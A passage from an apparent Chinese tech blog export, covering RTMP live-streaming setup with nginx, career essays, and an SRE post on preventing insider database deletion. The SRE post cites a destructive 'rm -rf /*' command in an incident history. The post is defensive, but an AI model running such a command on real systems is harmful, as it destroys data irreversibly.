server)方法，让音视频浏览端，发出一个请求，网络摄像机只是不停地向浏览端推送封装成RTP分组的音视频编码数据，网络摄像机可以用很小的系统开销实现流媒体传输。 HTTP(HyperText Transfer Protocol)超文本传输协议，网络摄像机通过HTTP协议提供Web访问功能，很方便地将音视频数据经过复杂网络传输，但实时音视频支持很不理想。比如苹果公司开发的HTTP Live Streaming（缩写是HLS）就是基于 HTTP 协议来实现的流媒体网络传输协议。它的工作原理是把整个流分成一个个小的基于HTTP的文件来下载，每次只下载一些。当媒体流正在播放时，客户端可以选择从许多不同的备用源中以不同的速率下载同样的资源，允许流媒体会话适应不同的数据速率。在开始一个流媒体会话时，客户端会下载一个包含元数据的extended M3U (m3u8) playlist文件，用于寻找可用的媒体流。HLS只请求基本的HTTP报文，与实时传输协议（RTP）不同，HLS可以穿过任何允许HTTP数据通过的防火墙或者代理服务器。它也很容易使用CDN来传输媒体流。但是其延迟相较于 RTMP 会比较高。 那通常我们所看到的各种直播平台都是基于 HLS 或 RTMP 进行的，一般情况下移动端会使用 HLS，兼容性比较好，而 PC 端则使用 RTMP 协议。 RTMP 是怎么工作的播放一个RTMP的流媒体需要经过以下几个步骤： 握手 建立连接 建立流 播放。 RTMP连接都是以握手作为开始的。建立连接阶段用于建立客户端与服务器之间的“网络连接”；建立流阶段用于建立客户端与服务器之间的“网络流”；播放阶段用于传输视音频数据。 握手（HandShake）一个RTMP连接以握手开始，双方分别发送大小固定的三个数据块 a)握手开始于客户端发送C0、C1块。服务器收到C0或C1后发送S0和S1。b)当客户端收齐S0和S1后，开始发送C2。当服务器收齐C0和C1后，开始发送S2。c)当客户端和服务器分别收到S2和C2后，握手完成。 握手 建立网络连接（NetConnection）a) 客户端发送命令消息中的“连接”(connect)到服务器，请求与一个服务应用实例建立连接。b) 服务器接收到连接命令消息后，发送确认窗口大小(Window Acknowledgement Size)协议消息到客户端，同时连接到连接命令中提到的应用程序。c) 服务器发送设置带宽()协议消息到客户端。d) 客户端处理设置带宽协议消息后，发送确认窗口大小(Window Acknowledgement Size)协议消息到服务器端。e) 服务器发送用户控制消息中的“流开始”(Stream Begin)消息到客户端。f) 服务器发送命令消息中的“结果”(_result)，通知客户端连接的状态。 建立连接4建立网络流（NetStream）a)客户端发送命令消息中的“创建流”（createStream）命令到服务器端。b)服务器端接收到“创建流”命令后，发送命令消息中的“结果”(_result)，通知客户端流的状态。 建立流5 播放（Play）a)客户端发送命令消息中的“播放”（play）命令到服务器。b)接收到播放命令后，服务器发送设置块大小（ChunkSize）协议消息。c)服务器发送用户控制消息中的“streambegin”，告知客户端流ID。d)播放命令成功的话，服务器发送命令消息中的“响应状态” NetStream.Play.Start &amp; NetStream.Play.reset，告知客户端“播放”命令执行成功。e)在此之后服务器发送客户端要播放的音频和视频数据。 播放流 从流媒体服务器下载流进行编码播放 如何搭建一个直播服务搭建一个直播服务的方式有很多种，以 nginx 为例，你可以在编译 nginx 的时候加入 nginx-rtmp-module 模块来实现 RTMP\\HLS 等实时流,也可以使用类似SRS这样的开源软件来实现，下面我将以 nginx 为例来实现一个直播服务器，如果你是使用 nginx，可以参考 1.首先，我们需要下载 nginx 和 nginx-rtmp-module 模块 123yum -y install gcc pcre-devel openssl-develwget -c https:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.17.9.tar.gztar zxvf nginx-1.17.9.tar.gz 12345git clone https:&#x2F;&#x2F;github.com&#x2F;arut&#x2F;nginx-rtmp-module.gitcd nginx-1.17.9.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --add-module&#x3D;..&#x2F;nginx-rtmp-module --with-http_ssl_modulemakemake install 2.配置 nginx 123456789rtmp &#123; server &#123; listen 1935; # 使用 udp 1935 端口 chunk_size 4096; application live &#123; # app 名称为 vod live on; &#125; &#125;&#125; 更具体的配置，请参考GitHub 的Example nginx.conf，nginx-rmtp-module 还可以配置转推、录播、点播等等方式，下面我们启动 nginx 1[root@localhost sbin]# .&#x2F;nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 3.接下来，我们需要放行 tcp 1935 端口 如何获取流当流媒体服务器搭建完毕之后，我们需要做两个步骤 推流: 将视频流编码后推到rtmp 服务 拉流：从 rtmp 服务器下载流进行编码播放 一个 RTMP 的 URL 格式如下 1rtmp:&#x2F;&#x2F;rtmp.example.com&#x2F;[app]&#x2F;[name] 这里的 app 名称就是 nginx 中配置的，是固定的值。后面的 name 是可以随便取的，我们可以按照 FFmpeg 或 obs 软件来推流，使用 FFmpeg 推流如下 1ffmpeg -i test.mp4 -vcodec libx264 -acodec aac -f flv rtmp:&#x2F;&#x2F;IP地址&#x2F;live&#x2F;test 这段命令 -i 表示加载本地视频文件 -vcodec 指定视频编码方式为h264 -acodec 指定音频编码方式为 aac -f flv 表示强制转行为 flv 格式推流 如图所示 如果使用 obs 软件来推流，只需要添加流名称即可，obs 下载地址 https://obsproject.com/ 首先，添加一个场景为媒体源，然后选择一个本地文件，当然 OBS 还可以添加你的本地显示器或窗口等等。 点击确定后，点击设置，切换到推流，选择服务为自定义，填写服务器地址和串流密钥，点击确定，然后点击开始推流即可。 当开始推流变成停止推流即表示推流成功 最后我们使用 vlc 播放，打开 VLC，使用 Network 方式输入 url","categories":[{"name":"直播","slug":"直播","permalink":"https://awen.me/categories/%E7%9B%B4%E6%92%AD/"}],"tags":[{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"}]},{"title":"被裁员，被保安赶出公司，程序员如何应对危机","slug":"被裁员，被保安赶出公司，程序员如何应对危机","date":"2020-03-21T08:44:56.000Z","updated":"2021-02-26T06:05:29.355Z","comments":true,"path":"posts/9efe72ab.html","link":"","permalink":"https://awen.me/posts/9efe72ab.html","excerpt":"","text":"近日，某互联网公司员工发帖称自己被公司裁员，该员工自述14年从上海交大毕业后就进入该企业工作，5年里，除了某段时间经常在后半夜两三点钟下班，主管说第二天早上可以请病假晚到一会儿之外，请病假的次数屈指可数，但因病被确诊为扩张型心肌病。后绩效被主管评为 D，遂被辞退。经过多次交涉，公司不给赔偿金，并威胁如果得要赔偿金后会对下一份工作不利，影响前途，多次交涉无果被保安赶出公司。 近些年类似的案例屡见不鲜，去年，中兴员工跳楼事件刷爆朋友圈。据说是给父母买了房，背负了几百万的房贷，一个人要养活两个孩子，老婆不上班，还有几个老人需要赡养，突然接到被公司辞退的通知，心理无法承受，跳楼自杀。 马上又到年底了，随着经济环境的恶化，企业盈利困难，裁员还会一浪接一浪的出现在新闻媒体上，就在几天前，就被爆出多家互联网金融公司裁员，例如最近 51 信用卡、呆萝卜、懒投资等等。 认清裁员的真相我相信大多数被裁的都是普通人，虽然牛人也会被裁员，例如乔布斯、陆奇这样的公司高管，但是凭借他们的能力，东山再起的可能性是要比普通人强上千百倍的，那么，我们普通人应该如何面对这场危机呢？ 首先，我觉得大家要认清一个事实，哪怕公司福利在好，在怎么人性化，公司也不是你家，公司存在的目的是为了赚钱的，因此裁员这个事情是最正常不过了，比如说你生病了，那么公司对你的预期就降低，公司有权利选择不让你继续干下去，比如不给赔偿，法律是规定要给赔偿金的，但是现实中有的公司会给，有的公司你不要就不给，这个需要自己去争取，当然我是鄙视那些裁员不给赔偿金的公司的。 很多人觉得稳定就是找一份高薪、优秀的公司然后一直干下去，亦或者只要努力工作，公司就会给升职加薪，我不知道现在还有多少人拥有这么幼稚的想法。 其次我认为大家要把工作当成是一种投资，投资的目的是把风险将到最低，收益达到最大，既然投资就有风险，这里面的风险就包含： 大环境不好，整个行业都出现问题，比如最近的互联网金融裁员。 公司或所在项目经营困难，难以维继，被迫裁员。 自身能力问题，被裁员。 不论哪一种原因被裁员，如果你恰好被裁，而你的收入来源主要是工资性收入，那你一定会面临非常大的压力。在恐怖点，你还上有老下有小，甚至背负着房贷。那压力会更大。那可有化解之法？ 做一个斜杠青年事实上，很多人都在开始行动，把自己变成一个“斜杠青年”，“斜杠青年”是一个新概念，来源于英文“Slash”，其概念出自《纽约时报》专栏作家麦瑞克·阿尔伯撰写的书籍《双重职业》。越来越多的年轻人不再满足“专一职业”的生活方式，而是选择能够拥有多重职业和身份的多元生活。 这就好比买股票，假设你有 100 万，你只买一只股票，那么当这只股票涨的很厉害的时候，你当然可以赚很多，而当行情不好，股票跌的时候，你也会亏的很厉害，那么最正确的做法就是分散投资，你可以选择： 只买一只股票，比如 100 万全部买乐视的股票（我相信你肯定已经在天台上了） 买不同的股票，最好是不同行业的白马股。（当股市不景气，你会被套牢） 买不同的股票，最好是不同行业的白马股，同时还去投资一些其他资产，比如一二线城市的房产，另外在购买一些黄金、国债，甚至国外优质股票等等方式分散风险。（当股市不景气，你可能会在其他投资产品上赚取利润，比如最近几年的房地产行业） 显然第三种方式更能够分散风险，这也像在做架构时要考虑双活、异地多活、高可用。不能把鸡蛋放在一个篮子里面。 有人肯定会说，你说的轻巧，一天上班都累得要死，尤其是我们 IT 行业，996 修福报，根本没有自己的时间，好不容易周末当然是要好好休息休息，哪有时间搞副业。可是你想过没有，你整天 996 这种状态完全就是不健康的，你应该做的就是尽力摆脱这种变态的工作方式。另外，你说做副业，不会又是骗人去做什么刷单、做微商卖狗皮膏药吧。 当然不是，我认为没有时间是你自认为的，有很多普通人有大把时间在刷抖音、追剧，就是没时间来学习提升自己或者锻炼自己的身体。 怎么做一个斜杠青年避免做重复性的机械性的工作如果你现在的工作内容非常的枯燥和重复，那你要小心了，这是不好的征兆，这意味着你的可替代性很强。一旦你的可替代性很强，那么意味着你被裁的几率就会大大提高。你可以选择主动点跟领导申请去做一些有挑战性的事情，哪怕暂时不赚钱，也要去做，只有在不确定的事情里面你才能获得更多更大的成长机会。否则你就是温水里的青蛙，总有一天水开了你就死了。 发挥自己的特长每个人都有自己的特长，比如你是一名程序员，除了代码写的好，还文章写的好，口才也较好，还会画画…… 你就可以发挥自己的特长，比如开设公众号，通过绘画的方式秒回程序员的日常，例如《神秘的程序员们》的作者就靠着专栏拥有很多的粉丝。 在比如你代码写的好，语言表达也很好，你可以去兼职教课，帮助更多新手程序员成长。 …… 在这个过程中，需要你坚持，可能一开始你不会赚很多钱，但是你可以在这个过程中不断完善不断扩大自己的影响力，让更多人喜欢你，把自己打造成一个大 IP，岂不是比你给人打工赚点死工资来的稳定多了。我身边很多人靠着副业赚取的收入就比主业高几倍的大有人在。 不断的学习这个无需多言，只有不断的吸收新知识，你才不会被社会淘汰。 好了，以上就是要和大家分享的一些心得，希望各位能够在未来的路上越走越远，越走越宽敞。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"低学历如何拿高薪进大厂","slug":"低学历如何拿高薪进大厂","date":"2020-03-21T08:42:15.000Z","updated":"2021-02-26T06:05:29.301Z","comments":true,"path":"posts/70daad89.html","link":"","permalink":"https://awen.me/posts/70daad89.html","excerpt":"","text":"从 2011 年毕业至今，工作将近 10 年了，从初入职场至今，我也算互联网老兵了，今天我给大家分享下一些求职涨薪的经历。 我现在是某互联网头部公司的高级技术工程师，刚进来的时候领导说我其实是特招进来的。因为我学历低，大专学历，而且还是学的文科专业。 很多人都知道我们单位其实对学历要求很高，哪怕是 985、211 的学生都可能会被筛掉，我身边的同事清一色重点本科大学科班出身的。他们的能力无疑都非常的强。 我为什么能进来呢？是学历造假了？ 其实不是的，我刚进来，领导说你学历是短板，但是你的工作经历和学习能力都很强，所以跟上级申请特招进来的。给的定级和其他人是一样的。 经历这么多年的打拼，我深刻地意识到学历的重要性，有本科学历的人他得到的机会远远大于没有本科学历的人，但是是不是说像专科学历的人就没有任何机会了呢？其实并非如此，任何机会都是要靠自己去争取的。 我是如何进到这家公司的呢？ 这要从 2013 年底我来杭州说起。2013 年11 月，我从上一家单位辞职，这家公司是做 IDC 机房托管服务的。我为啥离职？原因是这份工作让我一眼看到了 10 年后是什么样的，薪资也就不到 3000 块钱，公司社保都不缴的，每天的工作枯燥重复，说是系统运维其实跟网吧网管没什么区别。 期间谈了个对象嫌弃我工资低，无奈分手。 经过这一波打击，我觉得我不能再这样下去了，我要改变现状，但是我既没学历，又没技术咋办呢？就这样一直在继续呆着和辞职之间来回之间纠结，你可能会问了，既然明知道没有前途，为啥不辞职，因为当时我迷茫啊，不知道自己想要什么，该干什么。 我相信这也是很多现代大学生毕业后的真实写照，没有明确的目标和规划，其实我当时还是有规划的，但是不知道怎么去实践和付诸于行动，我当时是想做运维工程师，所以我就去做了运维。但是发现这活技术没提升，能力也没上去。后来终于下定了决心辞职，可是刚递交辞呈家里就出了点意外，我弟弟因为车祸住院，本来计划转行结果被打乱了，只能先去医院照顾他，在医院一呆就是将近一个月时间。在 12 月底我把他送回了老家，就立马出来找工作。我计划先找份工作，不论薪资高低先干着，然后每周去培训充电提升自己的技术能力，骑驴找马。事实上证明这一步行之有效。 后来终于下定了决心辞职，可是刚递交辞呈家里就出了点意外，我弟弟因为车祸住院，本来计划转行结果被打乱了，只能先去医院照顾他，在医院一呆就是将近一个月时间。在 12 月底我把他送回了老家，就立马出来找工作。我计划先找份工作，不论薪资高低先干着，然后每周去培训充电提升自己的技术能力，骑驴找马。事实上证明这一步行之有效。 怎么做呢？ 首先，我按照之前的工作经验找了份类似的工作先做着，工资 3500，然后利用周末去参加培训，学网络和系统运维技术。 现在回想起来，我都不知道当时是怎么熬过来的，那份工作需要倒班，我通宵工作到早上交班后就坐公交车到市区上课，来回 3 小时。每周如此，坚持了大半年。 因为我知道我自己的起点比别人低，我必须加倍努力才能快速进步。由于没钱，我又不好意思伸手向家里要，爸妈辛苦把我供到大学毕业已经很不容易了，我不想在给他们添麻烦，于是我选择了分期付款的方式去参加培训。成效是有的，从一个网络零基础的人迅速学会了各种网络协议和路由协议技术。后来我把我学的这些东西拿去讲给别人听，还把培训费给赚回来了。既收获了知识又赚到了钱。 我分析了一波市场上对于纯网络工程师的需求，发现给的待遇普遍不高，只有四五千。我觉得仅仅会网络技术和系统运维技术还不够，未来始终是要向自动化运维发展，于是我又开始去学Java编程。 为什么选择 Java，因为 C 太复杂，各种指针、内存分配，而 Python 语法过于简单，比如对于字符类型的转换等，不利于了解编程的一些核心技术，所以我选择了学 Java，因为我认为编程语言都是触类旁通的，学会一个其他的稍微看看语法就都能看懂。 所以其实到这里，对于低学历的人你就需要学会分析市场的需求，怎么分析呢？找准自己的目标，比如是要做开发，那你就去看看开发岗位都需要哪些技能，运维岗你就要看看运维岗位需要哪些技能，然后对照着自己的能力进行评估，看看哪些是会的哪些是不会的，不会的就去补齐短板。 如果你把目标岗位的技能都学的差不多了，你就可以出去找工作了，但是你会看现在招聘网站都是要求本科以上学历，很多用人单位在筛选简历时可能直接就以学历为条件直接过滤掉了非本科的，事实真的是如此吗？ 事实上，企业招聘的时候把要求定的高其实是为了节省筛选人的成本，一般来说拥有本科学历的人他的学历能力大部分是要比非本科的强的？那既然现在本科生都一抓一大把，为什么他要去给非本科生的机会呢？那既然如此，非本科怎么获得机会呢？我这里给几个建议哈，当然这也是没有办法中的办法： 你可以不在招聘网站投简历，直接到用人单位的官网找到联系方式比如邮箱之类的，去投递简历试试。 如果你的能力尚可，用人单位也不是说必须非本科不录用，况且，学历低是你的劣势，但是对于用人单位来说在薪资谈判的时候你可能就会吃点亏了哦，但是不要紧，咱们的目标是获得相关工作经历，为以后的成长打基础，暂时的得失不要过于在乎。 当你有了一定的工作经历之后，如果你的工作开始日复一日的重复之前的工作，你就得小心了，千万不要让自己过得太舒服，安逸的工作环境是会毁了一个人的，这个时候如果你发现自己的能力没有什么提升就该考虑跳槽了。当你这么工作个几年，其实学历对于你的影响就比较小了，一般用人单位在招聘的时其实重点还是看你的工作能力和学习能力是否强，学历当然也要看的，但是这个阶段就并不是那么强了，除非是跨国企业或外企之类的。 其实低学历的人只要努力，找准方向也可以拥有比较好的未来。大家都是为了混口饭吃，360 行，行行出状元，关键看自己是否用心了。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"删库跑路，从 SRE 的角度看如何避免","slug":"删库跑路，从-SRE-的角度看如何避免","date":"2020-03-21T01:33:47.000Z","updated":"2021-02-26T06:05:29.316Z","comments":true,"path":"posts/242f6f7a.html","link":"","permalink":"https://awen.me/posts/242f6f7a.html","excerpt":"","text":"作为程序员经常相互开玩笑说，公司要是把我逼急了，大不了我们“删库跑路”，这是一句玩笑话,基本上还有理智的人也没有人这样干，但是不理智的人也蛮多的。 近日微盟官网发送一则故障通知，该通知称其公司业务系统数据库（包括主备）遭遇其公司运维人员的删除。 据悉，目前犯罪嫌疑人已经被宝山区公安局进行刑事拘留，犯罪嫌疑人承认了犯罪的事实。犯罪嫌疑人乃微盟研发中心运维部核心运维人员贺某，贺某于2月23日晚18点56分通过个人魔法上网登入公司内网跳板机，因个人精神、生活等原因对微盟线上生产环境进行了恶意的破坏。 事件回顾 我这边根据该公告对该故障进行回溯，如下： 2020年 2 月 23 日晚 18:56 分该企业运维部门核心员工贺某通过 VPN 登入内网，官方称是因为个人精神、生活等原因开始对生产环境进行恶意破坏。 2020 年 2 月 23 日 19:00 系统监控发出报警。 2020 年 2 月 25 日 7 时，恢复部分生产环境的数据，但是老用户预计还需要 2 月 28 日晚上才能恢复。 为什么会发生删库通过梳理我们可发现这次的删库事件是非常严重的。事实上，最近几年删除跑路的事情屡见不鲜，有误操作导致的也有恶意的情绪发泄导致的报复性删库： 2018 年 8 月，顺丰公司一员工接到一个变更需求，因为选错了实例，将一数据库删除。因工作不严谨导致该系统上临时车线上发车功能无法使用并持续约590分钟。事后该员工被开除。 2018年4月，VPS 服务商 Kuriko 因因机房技术人员 rm -rf /*，宿主机上所有数据丢失了。 2017年9月，某企业技术工程师帮助广西移动进行扩容割接（即增加系统容量）时，不小心将 HSS 设备里面的用户数据格式化删除，导致广西移动近 80 万用户数据丢失。 2017年6月，一家荷兰海牙的云主机商 verelox.com，一名前任管理员删光了该公司所有客户的数据，并且擦除了大多数服务器上面的内容。 对于恶意删库，事实上，我国《刑法》第二百八十六条规定对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。 2018 年北京一软件工程师徐某离职后因公司未能如期结清工资，便利用其在所设计的网站中安插的后门文件将网站源代码全部删除。记者20日从北京市丰台区人民法院获悉，徐某破坏计算机信息系统罪成立，获刑五年。 2018 年杭州科技公司的技术总监邱某因不满企业裁员，该员工从 2014 年入职到 2018 年，公司的主要系统都由他搭建，包括公司的 SaaS 系统、API 系统、电子合同的签署等服务，2018 年初公司大概有 4 万多用户。2018 年 4 月，老板宓某某找到邱某，告诉他让他尽快离职，后面他也提交了辞职报告，但是心里一直都很不爽。遂心生报复，远程登录服务器删除了数据库上的一些关键索引和部分表格，造成该企业直接经济损失 225 万元，后被判赔偿公司 8 万元，判刑 2 年 6 个月，缓刑三年。 如何防止删库事件发生类似这种故障，不同于一般的黑客入侵或误操作，而是因为内部发起的恶意破坏，这种其实是最难防范的，大多数中小企业都无法避免这种问题发生，首先是由于企业规模问题，不可能招聘一个专门的 DBA 来进行运维，很多时候都是一个开发兼顾写代码加运维。其次，中小企业要想对一个系统的权限划分的特别细致是不现实的。但是即便如此，我们也要通过一些方案来预防这类事件的发生，那么如何做呢？ 首先，是要进行权限分级，可以根据权限和角色进行划分： 权限划分 这种适合中小企业，因为中小企业不会单独划分系统运维、业务运维、DBA 这种角色，比如要执行一个删除操作，由发起人发起删除请求，将需要操作的事项详细列出，交由相关负责人进行审批，负责人审批确认命令是否合理，审批通过后在交给专门的执行者去执行操作。这样以来可以追根溯源，有备可查，否则一旦出现问题都不知道是谁干的，二来可以防止人为破坏，除非真正的实施者去进行破坏。对于实施者这一层，可以对操作系统和数据库进行权限划分，针对不同的业务系统，对于操作系统本身和数据库进行合理的权限划分，针对不同人设置不同的登录账户，对不同的数据库、表划分不同的操作权限，避免因为误操作导致的删库问题发生。 角色划分 这种适合有一定规模的企业，对于运维人员分为业务运维、网络运维、DBA 等等，每个角色负责自己操作权限，不能越权，比如业务运维只能针对业务的相关进程和服务进行修改操作、系统运维只能对操作系统的权限进行调整，但是不能操作数据库、而 DBA 只能操作数据库，但是不能修改其他服务的配置文件和相关进程数据等等，更不能执行类似rm之类的高位命令。 其次，流程规范化，除了角色划分和权限控制，对于运维人员的工作流程要进行规范化，并培养安全意识，禁止一切非流程化的变更。对于生产环境的变更，例如执行什么命令，都要进行审批，最好是在演练环境先测试无误后再进行变更，防止意外事故发生。 此外对于删除、更新这种高危操作一定要进行严格的审核，确认无误后方可操作。在《阿里巴巴JAVA开发手册》中，对于 Mysql 的变更要先执行 select，避免直接执行 delete，防止误删除。 第三，是定期演练 ,随着企业规模以及人员变动等因素，要定期按照流程和规范对系统进行故障演练，比如断电恢复、数据删除恢复等场景进行演练，这样一来可以加强对应开发和运维人员对于流程和规范的认识，二来平时参与到这种模拟环境中，可以在真正的故障面前不会手忙脚乱。 第四，是定期备份，对于备份的重要性，我想不需要多说，对于重要的业务系统中的每一个服务都不能存在单点，要时刻保数据的备份，以 MySQL 为例： 选择合适的引擎，比如 MySQL 要支持事务操作，那必然要选择 InnoDB，而不能选择MyISAM。 常规备份，要定期对数据库进行备份，除了本地要有备份，还要进行远程备份，或者多机备份。可以通过脚本配合计划任务进行定时备份。 主从备份，除采用主从备份可以实时性的对数据进行同步，并保证高可用性。切记不可将主从部署在同一台机器上。 异地多活，有条件的还可以采用异地多活，即防止某个区域出现意外导致断电或硬件损坏等导致数据丢失。 但是，事实上，从我的从业经历看，很多公司对于数据的备份是重视不够的，我总结起来就是两点： 一个是出于成本考虑，不舍得实行主从备份，这个无可厚非，但是就算不舍得投入成本，本地备份好歹做一个，防范于未然也是好的。 第二个是，安全意识不够，过于的相信云厂商的技术，觉得上云后备份这种事情就交给云厂商去做了，我遇到一些企业竟然直接把数据存储在系统盘，后来遭遇黑客入侵，系统盘被他玩坏了，数据都找不回来了。也没有充分利用云厂商提供的快照和镜像等功能进行数据备份，本地也没有备份。事实上，现在各家云服务商都会提到其平台拥有几个 9 的数据可靠性，并且有快照、异地容灾，多副本存储等容灾策略，但是我们要知道并没有绝对安全的云服务商，即使备灾策略看似完善，但依然很难避免因人为操作不规范而导致的故障。 2018 年，某公司发文称，在使用腾讯云8个月后，在云服务器上的数据全部丢失，腾讯云三备份数据也全部离奇丢失，平台业务全部停运，融资计划停止，损失巨大。事后发现该企业竟然直接把数据存储在系统盘，没有做好备份，此外就是过于相信云厂商的三副本安全机制而引发的悲剧。 最后，加强人文关怀，虽然我不清楚这个员工为什么会没有理智的干出这种事情，微盟只是说员工个人精神和生活等原因导致的，这里我也不敢妄加揣测，一切都以法院最终的审判为准，但是我在此要提醒下一些企业，要对自己的员工好点，尤其是核心员工，比如提供有竞争力的薪资和福利、裁员时给予规定的补偿、关注下员工的精神和生活等方面的问题，大家都好聚好散。 对于员工而言，如果说在工作中遇到了一些不公平的遭遇，比如欠薪、恶意刁难，或者持续的无偿加班尽量选择通过正规的法律途径来解决或者换个工作环境，而不要选择走极端的违法行为。想一想一旦被判刑这将是终身的污点，对于未来的生活和工作都造成不可逆的影响。 “删库跑路”常常是程序员说的段子，但如果这个段子成为了事实，那么不论是对于企业还是员工都需要付出沉重的代价。","categories":[{"name":"运维","slug":"运维","permalink":"https://awen.me/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://awen.me/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"求求你，别拿大环境不好当借口","slug":"求求你，别拿大环境不好当借口","date":"2020-03-21T01:32:24.000Z","updated":"2021-02-26T06:05:29.344Z","comments":true,"path":"posts/3538a835.html","link":"","permalink":"https://awen.me/posts/3538a835.html","excerpt":"","text":"首先，跟大家说一个事情，我跳槽了，已经向公司递交了辞职信，并在安排交接，众所周知，往年的三四月份是跳槽的高峰期，俗称”金三银四“，被裁员的、拿完年终奖跑路的都纷纷出来探一探行情，但是今年的”金三银四“并不那么火热，伴随着疫情带来的恐惧感和新闻媒体不断报出来的裁员减薪，很多在年前筹划着准备找工作的人都放缓了跳槽的念头，甚至有一些年前递交辞职报告裸辞的人到现在为止还在老家呆着。 在此之前，很多朋友和家人都劝我要慎重，说目前大环境不好，而且又是疫情期间，甚至还有家人劝我不要来杭州上班，等疫情过去之后在回来之类的，当然家人可能也是担心我的安危，怕钱没赚到身体搞坏了，但是我始终觉得，都是成年人了，咱能不能别把大环境不好当借口来掩饰自己的无能。 我其实也是在年前就有考虑年后换个工作环境，原因有如下几点： 第一，我在这个岗位已经做了有将近三年了，该会的我都会了，每天的工作基本都是重复昨天的事情，没有什么挑战性和成就感。 第二，薪资待遇方面我希望有所提高，但是随着疫情影响，加薪幅度感人，加上去年买了房子，但是个期房还未交付，因此我还需要租房。租金加房贷压力也挺大的。 第三，在以上 2 点的基础上在加上每天来回要通勤 3 小时时间，我评估了下一年的收入和付出感觉不是很划算。 第四，我觉得我需要被市场重新进行评估我的价值。 我在之前写过一篇《你什么时候该考虑跳槽了？》中提到过几种情况你应该考虑跳槽： 你和你的直接上司“三观不合” 你所在的行业整体环境很差，例如整个行业在不断裁员 你开始长期厌倦你的工作 比如说： 日复一日的重复性劳动，也完全不需要动脑子，只需要熟练操作，就像工厂的工人一样流水线式作业就行。 你在这个岗位已经工作很多年，工作闭着眼睛都会做，现在与过去的工作内容毫无变化。 你在这个岗位学不到任何更深的东西，都是一些皮毛，看不到你的职业前景，且加薪晋级无望。 你身边的同事人浮于事，不思进取。 如果是以上这种情况，并且你也不爱你现在的工作了，那么久没有继续干下去的必要了。 那我显然我跳槽的原因是第三点了，我感觉我的工作有点重复了，因此，我选择了换个工作环境，我希望新的工作可以给我带来不一样的体验和成就感，重新激活我的一些能力，当然还有薪资上的提升，但这并非最主要的原因，我觉得人有时候需要换下环境来给自己带来一些不一样的挑战。事实上，美国学者库克曾提出过一条曲线，说的是我们在工作中的创造力发挥程度，随着工作时间的增加而改变的过程：A-B这个阶段是我们进入一家公司工作的头两年，此时我们的创造力处于稳步上升期；工作第2-3年是创造力发挥的最佳期B-C阶段；3年以后，我们的创造力会进入衰减稳定期D-E阶段。 其实对于跳槽，有一些东西是没有办法通过跳槽来改变的，在上一家出现的一些问题很可能在下家还是会存在，每一个公司或工作都有他的一些不完美之处。我觉得在步入职场那一刻，除了要掌握专业技术能力之外，还需要学习一些通用功能才能在职场上游刃有余： 学习能力，前两天和一个做研发的同事一起下班回来聊到了学习能力这个事情，他就说你有没有发现一些人的学习能力特别差，像我们做开发的接触一个新东西，很快都能把他学会，我这个朋友说他一天搜索引擎都要使用几百次。不懂的就去查，但是在现实中很多人在搞一个新东西的时候连查都懒得去查，也不爱学习。这种肯定是最先被淘汰了，而我工作这么多年发现那些优秀的人他们的学习能力都特别的强，同时他们的解决问题能力也很强。他们在遇到难题的时候不是想着这个东西我不会，我就不想做了，而是想着这个东西我不会，我怎么才能去搞定它。我觉得这是一个普通职场人需要有的能力，即解决问题的能力。 沟通能力，有些人性格内向，不太善于主动与同事和上司沟通，工作中也因此屡屡碰壁，尤其是程序员，很可能擅长写代码和机器打交道的时间比人多，因此很多人不善于沟通，这不论是对于求职还是工作都非常麻烦。 自我反省的能力，我上面说了很多人明明是自己能力问题导致找不到工作，非要怪大环境不好，这就是缺乏自我反省，优秀的人应该要自我发现和改变自己的不足之处，当我们遇到困难时，首先冷静下来去思考“为什么会这样？”,思考是什么原因造成了不理想的结果，再从这些原因之中，分析哪些是客观原因、哪些是主观原因，找出了这些原因之后把他们一一列举出来。 每个人都需要不断的学习才能够让自己快速成长起来，这些能力是在职场上生存所必备的通用技能，我们必须要掌握它。 当然了，我觉得在跳槽之前是需要有所准备的，首先你需要物色你的下家，然后准备面试，多面几家看看找准自己的市场定位，我不推荐各位裸辞，一旦发生意外失去收入，除了自身生活方面会带来影响而且还会在与下家谈判的时候失去筹码，很可能谈不到期望的薪资。另外我也不建议频繁的更换行业，这样也会让你丧失你之前的优势。 有时候，人要逼一逼自己，该跳槽时就得跳，千万别拿外界因素给自己找躲避的理由，我们之所以努力，不是给老板看，而是为了自己，为了自己能够过的更好，为了能够成就更好的自己。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"云时代，运维人员应该如何成长","slug":"云时代，运维人员应该如何成长","date":"2020-03-21T01:26:10.000Z","updated":"2021-02-26T06:05:29.298Z","comments":true,"path":"posts/9a614e3b.html","link":"","permalink":"https://awen.me/posts/9a614e3b.html","excerpt":"","text":"今天看到了一句话：运维催人老，项目人肉搞，技术含量低，前景也不好，出力没奖金，晋升就瞎搞。这也是很多运维人的共鸣，甚至大家都在相互传递焦虑。 其担忧背后的原因是随着云计算的快速发展涌现出虚拟化技术和容器化技术和容器编排技术，例如 Docker、Kubernetes ，以及市场上这些例如亚马逊、阿里云、腾讯云这样的云服务商，他们把一些日常使用的运维服务都做成了 PASS或 SASS 服务。以前我们搭建一个集群，需要自己准备机器然后批量部署系统、搭建个负载均衡或 Mysql 集群、Redis 集群、搞套类似 ELK的 web 服务日志采集系统、搭个 zabbix 监控等，得自己配置主从、做好高可用，而现在有现成的产品，鼠标点点或调用下云厂商的 API 